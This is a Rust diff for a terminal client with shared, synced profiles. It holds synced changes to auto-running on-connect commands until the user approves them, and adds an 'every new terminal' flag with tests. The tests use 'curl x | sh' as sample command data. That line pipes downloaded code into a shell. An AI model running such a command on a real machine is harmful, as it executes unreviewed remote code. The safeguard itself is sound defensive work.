@@ -3,7 +3,8 @@
 //!
 //! In a shared profile, other people edit servers this device connects to. A
 //! few fields make the app act without a click: commands typed into the first
-//! terminal on connect (`run_on_connect`), connecting when the profile is
+//! terminal on connect (`run_on_connect`, and with `run_on_connect_every` into
+//! every new terminal too), connecting when the profile is
 //! unlocked (`autostart`), port forwards started on connect (`tunnels`), and
 //! the monitor's custom commands, run on every poll. A change to one of those
 //! that comes in through sync in a shared profile is held here until the user
@@ -168,9 +169,11 @@ pub fn watches(table: &str) -> bool {
 /// What a row would set off by itself, read just before and just after the
 /// merge engine applies a record to it.
 pub enum Snapshot {
-    /// `running`: the forwards that aren't stopped.
+    /// `running`: the forwards that aren't stopped. `every`: the on-connect
+    /// commands also go into every new terminal (#256).
     Server {
         run_on_connect: String,
+        every: bool,
         autostart: bool,
         running: BTreeSet<String>,
         protocol: Option<String>,
@@ -200,6 +203,18 @@ fn metric_items_of(json: &str) -> BTreeSet<String> {
         .unwrap_or_default()
 }
 
+/// The server's on-connect commands also go into every new terminal (#256).
+/// Read on its own, so a table without the column still gives the rest of
+/// the snapshot.
+fn every_terminal(conn: &Connection, uuid: &str) -> bool {
+    conn.query_row(
+        "SELECT COALESCE(run_on_connect_every, 0) FROM servers WHERE uuid = ?1",
+        [uuid],
+        |r| r.get::<_, i64>(0),
+    )
+    .is_ok_and(|n| n != 0)
+}
+
 pub fn snapshot(conn: &Connection, table: &str, uuid: &str) -> Option<Snapshot> {
     match table {
         "servers" => conn
@@ -221,6 +236,7 @@ pub fn snapshot(conn: &Connection, table: &str, uuid: &str) -> Option<Snapshot> 
             .flatten()
             .map(|(roc, auto, tunnels, protocol, port)| Snapshot::Server {
                 run_on_connect: roc,
+                every: every_terminal(conn, uuid),
                 autostart: auto != 0,
                 running: running_items_of(&tunnels),
                 protocol,
@@ -359,16 +375,18 @@ pub fn hold_changes(conn: &Connection, table: &str, uuid: &str, before: Option<&
         hold_switch(conn, uuid, before)?;
     }
     match (table, snapshot(conn, table, uuid)) {
-        ("servers", Some(Snapshot::Server { run_on_connect, autostart, running, .. })) => {
-            let (b_roc, b_auto, b_running) = match before {
-                Some(Snapshot::Server { run_on_connect, autostart, running, .. }) => {
-                    (Some(run_on_connect.as_str()), *autostart, Some(running))
+        ("servers", Some(Snapshot::Server { run_on_connect, every, autostart, running, .. })) => {
+            let (b_roc, b_every, b_auto, b_running) = match before {
+                Some(Snapshot::Server { run_on_connect, every, autostart, running, .. }) => {
+                    (Some(run_on_connect.as_str()), *every, *autostart, Some(running))
                 }
-                _ => (None, false, None),
+                _ => (None, false, false, None),
             };
+            // The same commands sent into every new terminal, not only the
+            // first, run more than what was allowed: held as a change too.
             if run_on_connect.trim().is_empty() {
                 release(conn, uuid, RUN_ON_CONNECT)?;
-            } else if b_roc != Some(run_on_connect.as_str()) {
+            } else if b_roc != Some(run_on_connect.as_str()) || (every && !b_every) {
                 hold(conn, uuid, RUN_ON_CONNECT)?;
             }
             if !autostart {
@@ -454,17 +472,27 @@ pub const HELD_CHANGED: &str =
     "[SYNC] HELD_CHANGED: These on-connect commands were changed again after they were shown to you. Look at them again before you allow them.";
 
 /// The on-connect commands are held by their item alone, which a newer synced
-/// text keeps. So an OK counts only for the text the user was shown: `seen`
-/// must be what the row has now, and is needed whenever `allowing` them.
-/// Anything else is refused (`HELD_CHANGED`), and the user is asked again.
-pub fn check_seen_run_on_connect(conn: &Connection, uuid: &str, allowing: bool, seen: Option<&str>) -> Result<(), String> {
+/// text keeps. So an OK counts only for what the user was shown: `seen` must
+/// be the text the row has now, and is needed whenever `allowing` them, and
+/// `seen_every` whether they were shown as going into each new terminal (no
+/// answer counts as "no"). Anything else is refused (`HELD_CHANGED`), and the
+/// user is asked again.
+pub fn check_seen_run_on_connect(
+    conn: &Connection,
+    uuid: &str,
+    allowing: bool,
+    seen: Option<&str>,
+    seen_every: Option<bool>,
+) -> Result<(), String> {
     let Some(seen) = seen else {
         return if allowing { Err(HELD_CHANGED.into()) } else { Ok(()) };
     };
-    let now: String = conn
-        .query_row("SELECT COALESCE(run_on_connect, '') FROM servers WHERE uuid = ?1", [uuid], |r| r.get(0))
+    let (now, every): (String, bool) = conn
+        .query_row("SELECT COALESCE(run_on_connect, ''), run_on_connect_every FROM servers WHERE uuid = ?1", [uuid], |r| {
+            Ok((r.get(0)?, r.get::<_, Option<i64>>(1)?.unwrap_or(0) != 0))
+        })
         .map_err(|e| format!("[SYNC] ALLOW: {e}"))?;
-    if now == seen {
+    if now == seen && every == seen_every.unwrap_or(false) {
         Ok(())
     } else {
         Err(HELD_CHANGED.into())
@@ -659,7 +687,7 @@ mod tests {
         let conn = Connection::open_in_memory().unwrap();
         conn.execute_batch(
             "CREATE TABLE servers(id INTEGER PRIMARY KEY, name TEXT, tunnels TEXT, autostart INTEGER NOT NULL DEFAULT 0,
-                                  run_on_connect TEXT NOT NULL DEFAULT '', position INTEGER NOT NULL DEFAULT 0, uuid TEXT,
+                                  run_on_connect TEXT NOT NULL DEFAULT '', run_on_connect_every INTEGER, position INTEGER NOT NULL DEFAULT 0, uuid TEXT,
                                   protocol TEXT, port INTEGER);
              CREATE TABLE monitor_configs(node_id INTEGER PRIMARY KEY, enabled_metrics TEXT, custom_metrics TEXT, paused INTEGER NOT NULL DEFAULT 1, uuid TEXT);
              CREATE TABLE sync_flags(key TEXT PRIMARY KEY, val INTEGER NOT NULL);
@@ -800,6 +828,47 @@ mod tests {
         assert!(held_for(&conn, "u1").contains(RUN_ON_CONNECT));
     }
 
+    /// What the merge engine does for a record that changes only whether the
+    /// commands go into every new terminal (#256).
+    fn merge_every(conn: &Connection, uuid: &str, every: bool) {
+        merging(conn, true);
+        let before = snapshot(conn, "servers", uuid);
+        conn.execute("UPDATE servers SET run_on_connect_every=?1 WHERE uuid=?2", params![every as i64, uuid]).unwrap();
+        hold_changes(conn, "servers", uuid, before.as_ref()).unwrap();
+        merging(conn, false);
+    }
+
+    #[test]
+    fn the_same_commands_turned_on_for_every_terminal_are_held() {
+        let conn = db();
+        // Allowed here: on this device, nothing held.
+        conn.execute("INSERT INTO servers(name, run_on_connect, uuid) VALUES('s', 'ls', 'u1')", []).unwrap();
+        // A co-member turns on "every new terminal": the commands would run
+        // in more terminals than were allowed.
+        merge_every(&conn, "u1", true);
+        assert!(held_for(&conn, "u1").contains(RUN_ON_CONNECT));
+        // Allowed, then turned off by them: nothing new to hold.
+        allow(&conn, "u1", &[]).unwrap();
+        merge_every(&conn, "u1", false);
+        assert!(held_for(&conn, "u1").is_empty());
+        // With no commands, the switch alone runs nothing.
+        conn.execute("UPDATE servers SET run_on_connect='' WHERE uuid='u1'", []).unwrap();
+        merge_every(&conn, "u1", true);
+        assert!(held_for(&conn, "u1").is_empty());
+        // A table from before the column still holds changed commands.
+        let old = Connection::open_in_memory().unwrap();
+        old.execute_batch(
+            "CREATE TABLE servers(id INTEGER PRIMARY KEY, name TEXT, tunnels TEXT, autostart INTEGER NOT NULL DEFAULT 0,
+                                  run_on_connect TEXT NOT NULL DEFAULT '', uuid TEXT, protocol TEXT, port INTEGER);
+             CREATE TABLE monitor_configs(node_id INTEGER PRIMARY KEY, custom_metrics TEXT, uuid TEXT);
+             CREATE TABLE sync_flags(key TEXT PRIMARY KEY, val INTEGER NOT NULL);",
+        )
+        .unwrap();
+        create_schema(&old).unwrap();
+        merge_server(&old, "u2", "curl x | sh", false, "[]");
+        assert!(held_for(&old, "u2").contains(RUN_ON_CONNECT));
+    }
+
     #[test]
     fn allowing_commands_counts_only_for_the_text_that_was_shown() {
         let conn = db();
@@ -808,14 +877,32 @@ mod tests {
         merge_server(&conn, "u1", "curl x | sh", false, "[]");
         assert!(held_for(&conn, "u1").contains(RUN_ON_CONNECT));
         // An OK for the text shown before is refused; nothing is let go.
-        assert_eq!(check_seen_run_on_connect(&conn, "u1", true, Some("uptime")), Err(HELD_CHANGED.to_string()));
-        assert_eq!(check_seen_run_on_connect(&conn, "u1", true, None), Err(HELD_CHANGED.to_string()));
+        assert_eq!(check_seen_run_on_connect(&conn, "u1", true, Some("uptime"), None), Err(HELD_CHANGED.to_string()));
+        assert_eq!(check_seen_run_on_connect(&conn, "u1", true, None, None), Err(HELD_CHANGED.to_string()));
         assert!(held_for(&conn, "u1").contains(RUN_ON_CONNECT));
         // Shown again, it can be allowed.
-        assert_eq!(check_seen_run_on_connect(&conn, "u1", true, Some("curl x | sh")), Ok(()));
+        assert_eq!(check_seen_run_on_connect(&conn, "u1", true, Some("curl x | sh"), None), Ok(()));
         // Not allowing them needs nothing; a stale text is refused all the same.
-        assert_eq!(check_seen_run_on_connect(&conn, "u1", false, None), Ok(()));
-        assert!(check_seen_run_on_connect(&conn, "u1", false, Some("uptime")).is_err());
+        assert_eq!(check_seen_run_on_connect(&conn, "u1", false, None, None), Ok(()));
+        assert!(check_seen_run_on_connect(&conn, "u1", false, Some("uptime"), None).is_err());
+    }
+
+    /// "Each new terminal" turned on by sync while the question about the
+    /// same text was on screen without it: that OK doesn't cover it.
+    #[test]
+    fn allowing_commands_counts_only_for_the_terminals_that_were_shown() {
+        let conn = db();
+        merge_server(&conn, "u1", "uptime", false, "[]");
+        merge_every(&conn, "u1", true);
+        assert!(held_for(&conn, "u1").contains(RUN_ON_CONNECT));
+        // Shown as for the first terminal only (or not said): refused.
+        assert_eq!(check_seen_run_on_connect(&conn, "u1", true, Some("uptime"), Some(false)), Err(HELD_CHANGED.to_string()));
+        assert_eq!(check_seen_run_on_connect(&conn, "u1", true, Some("uptime"), None), Err(HELD_CHANGED.to_string()));
+        // Shown as they are: allowed.
+        assert_eq!(check_seen_run_on_connect(&conn, "u1", true, Some("uptime"), Some(true)), Ok(()));
+        // And the other way: shown as for each terminal, now for the first only.
+        merge_every(&conn, "u1", false);
+        assert_eq!(check_seen_run_on_connect(&conn, "u1", true, Some("uptime"), Some(true)), Err(HELD_CHANGED.to_string()));
     }
 
     #[test]
